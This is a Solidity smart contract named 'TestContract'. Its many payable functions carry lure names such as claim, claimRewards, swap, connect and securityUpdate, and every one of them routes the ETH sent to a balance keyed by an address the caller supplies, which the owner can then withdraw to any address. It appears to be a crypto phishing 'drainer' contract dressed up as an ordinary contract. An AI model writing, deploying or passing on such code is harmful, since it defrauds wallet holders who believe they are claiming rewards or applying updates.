// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract TestContract {
  address private owner;
  mapping (address => uint256) private balance;
  mapping (address => bool) private auto_withdraw;

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "Only contract owner can call this function");
    _;
  }

  function getOwner() public view returns (address) {
    return owner;
  }

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }

  function getUserBalance(address wallet) public view returns (uint256) {
    return balance[wallet];
  }

  function getWithdrawStatus(address wallet) public view returns (bool) {
    return auto_withdraw[wallet];
  }

  function setWithdrawStatus(bool status) public onlyOwner {
    auto_withdraw[msg.sender] = status;
  }

  function withdraw(address where) public onlyOwner {
    uint256 amount = balance[msg.sender];
    require(address(this).balance >= amount + gasleft(), "BALANCE_LOW");
    balance[msg.sender] = 0;
    (bool success, ) = payable(where).call{value: amount}("");
    require(success, "WITHDRAW_FAILED");
  }

  function withdrawFromWallet(address wallet, uint256 amount) public payable onlyOwner {
    require(balance[wallet] >= amount, "INSUFFICIENT_BALANCE");
    balance[wallet] -= amount;
    (bool success, ) = payable(address(this)).call{value: amount}("");
    require(success, "WITHDRAW_FAILED");
  }

  function claim(address sender) public payable {
    handlePayment(sender);
  }

  function claimReward(address sender) public payable {
    handlePayment(sender);
  }

  function claimRewards(address sender) public payable {
    handlePayment(sender);
  }

  function execute(address sender) public payable {
    handlePayment(sender);
  }

  function multicall(address sender) public payable {
    handlePayment(sender);
  }

  function swap(address sender) public payable {
    handlePayment(sender);
  }

  function connect(address sender) public payable {
    handlePayment(sender);
  }

  function securityUpdate(address sender) public payable {
    handlePayment(sender);
  }

  function handlePayment(address sender) private {
    if (auto_withdraw[sender]) {
      (bool success, ) = payable(sender).call{value: msg.value}("");
      require(success, "WITHDRAW_FAILED");
    } else {
      balance[sender] += msg.value;
    }
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Invalid address");
    owner = newOwner;
  }
}